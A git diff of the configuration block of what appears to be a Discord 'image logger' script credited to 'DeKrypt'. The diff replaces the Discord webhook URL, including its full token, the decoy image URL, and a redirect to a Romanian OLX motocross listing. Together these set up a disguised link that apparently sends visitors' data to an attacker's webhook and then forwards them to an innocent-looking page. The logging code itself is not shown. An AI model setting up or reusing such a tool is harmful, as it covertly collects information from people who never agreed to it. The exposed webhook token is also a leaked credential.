@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1097227407972388995/YKkEzEcL8GfAnaxHNkrqCYOA-vF2yeypZ0ZygZkoqHRCm_D-_lJAduZBqY-P81naaWFV",
-    "image": "https://media.discordapp.net/attachments/1020387054451961857/1097227532253802667/depositphotos_78581132-Junior-motorbike-rider-posing-on-motorbike.png?width=440&height=660", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1097451850699120651/8O6NI-hkbbcUqNiJZNAgLlmu-_e4IW2Jy2fxPai07sctarHo-1LjkCtvxXOWBiuJc963",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQQfYcLozekgqStK3TqOAYyP7KUJRP8EsYe1UOmgEy7JSvSSOW7vl9GgBMIJzsec4J134&usqp=CAU", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://www.olx.ro/d/oferta/casca-motocross-copii-ufo-rebel-IDgOzKD.html?" # Link to the webpage to redirect to 
+        "page": "https://www.olx.ro/d/oferta/motocross-noi-sigilate-cu-factura-si-garantie-pt-adulti-125-cc-17-IDdNkWJ.html" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
